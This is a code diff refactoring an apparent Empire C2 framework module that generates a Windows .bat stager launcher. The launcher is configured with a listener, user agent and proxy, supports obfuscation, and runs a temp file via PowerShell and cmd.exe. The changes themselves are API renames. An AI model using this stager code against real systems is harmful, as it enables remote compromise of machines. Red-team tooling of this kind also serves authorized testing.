@@ -1,12 +1,9 @@
 from __future__ import print_function
 
-import pathlib
 from builtins import object, str
 from typing import Dict
 
-from empire.server.common import helpers
-from empire.server.common.module_models import PydanticModule
-from empire.server.utils import data_util
+from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
@@ -14,14 +11,14 @@ class Module(object):
     @staticmethod
     def generate(
         main_menu,
-        module: PydanticModule,
+        module: EmpireModule,
         params: Dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
 
         # read in the common module source code
-        script, err = main_menu.modules.get_module_source(
+        script, err = main_menu.modulesv2.get_module_source(
             module_name=module.script_path,
             obfuscate=obfuscate,
             obfuscate_command=obfuscation_command,
@@ -37,7 +34,7 @@ class Module(object):
         script = module_code
 
         # generate the .bat launcher code to write out to the specified location
-        launcher = main_menu.stagers.stagers["windows/launcher_bat"]
+        launcher = main_menu.stagertemplatesv2.new_instance("windows_launcher_bat")
         launcher.options["Listener"]["Value"] = params["Listener"]
         launcher.options["UserAgent"]["Value"] = params["UserAgent"]
         launcher.options["Proxy"]["Value"] = params["Proxy"]
@@ -67,7 +64,7 @@ class Module(object):
                 + '" -Command "C:\\Windows\\System32\\cmd.exe /C $tempLoc"'
             )
 
-        script = main_menu.modules.finalize_module(
+        script = main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
